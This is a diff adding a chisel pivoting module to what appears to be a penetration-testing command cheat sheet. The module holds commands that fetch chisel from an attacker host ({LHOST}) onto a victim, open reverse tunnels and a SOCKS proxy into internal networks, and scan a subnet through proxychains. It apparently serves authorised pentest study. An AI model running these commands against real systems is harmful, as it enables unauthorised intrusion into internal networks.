@@ -134,6 +134,9 @@
     <div class="sidebar-item" data-filter="ligolo-ng">
       <span class="label">ligolo-ng</span>
     </div>
+    <div class="sidebar-item" data-filter="chisel">
+      <span class="label">chisel</span>
+    </div>
 
   <!-- END LINES -->
   </aside>
@@ -784,6 +787,44 @@ EOF
       { cmd: `./agent.exe -connect <MS01_IP>:11601 -ignore-cert`, category: 'ligolo-ng' },
       { cmd: `./agent -connect <MS01_IP>:11601 -ignore-cert`, category: 'ligolo-ng' },
       { cmd: `listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999 --tcp`, category: 'ligolo-ng' },
+
+
+
+
+      // ===== chisel MODULE =====
+      { cmd: `https://github.com/jpillora/chisel/releases`, category: 'chisel' },
+      { cmd: `https://0xdf.gitlab.io/cheatsheets/chisel`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# linux`, category: 'chisel' },
+      { cmd: `wget https://github.com/jpillora/chisel/releases/download/v1.12.0-rc2/chisel_1.12.0-rc2_linux_amd64.gz `, category: 'chisel' },
+      { cmd: `wget http://{LHOST}/chisel`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# windows`, category: 'chisel' },
+      { cmd: `wget https://github.com/jpillora/chisel/releases/download/v1.12.0-rc2/chisel_1.12.0-rc2_windows_amd64.zip`, category: 'chisel' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/chisel.exe -o chisel.exe"`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `#In kali`, category: 'chisel' },
+      { cmd: `sudo apt install chisel`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# Server For Pivoting`, category: 'chisel' },
+      { cmd: `sudo chisel server -v -p 1234 --reverse --socks5`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# Access Victim localhost`, category: 'chisel' },
+      { cmd: `./chisel client -v {LHOST}:1234 R:8080:127.0.0.1:80 &`, category: 'chisel' },
+      { cmd: `.\\chisel.exe client -v {LHOST}:1234 R:8080:127.0.0.1:80 `, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# Access Victim Internal Host`, category: 'chisel' },
+      { cmd: `./chisel client -v {LHOST}:1234 R:8080:172.3.2.9:80 &`, category: 'chisel' },
+      { cmd: `.\\chisel.exe client -v {LHOST}:1234 R:8080:172.3.2.9:80 `, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# Access on kali`, category: 'chisel' },
+      { cmd: `curl http://127.0.0.1:8080`, category: 'chisel' },
+      { cmd: ``, category: 'chisel' },
+      { cmd: `# Client SOCKS PROXY`, category: 'chisel' },
+      { cmd: `./chisel client -v {LHOST}:1234 R:1080:socks &`, category: 'chisel' },
+      { cmd: `.\\chisel.exe client -v {LHOST}:1234 R:1080:socks `, category: 'chisel' },
+      { cmd: `sudo bash -c 'echo -e "#dynamic_chain\nstrict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 \t127.0.0.1 1080" > /etc/proxychains4.conf'`, category: 'chisel' },
+      { cmd: `proxychains4 -q nmap -sT -Pn 172.3.2.0/24`, category: 'chisel' },
 
 
 
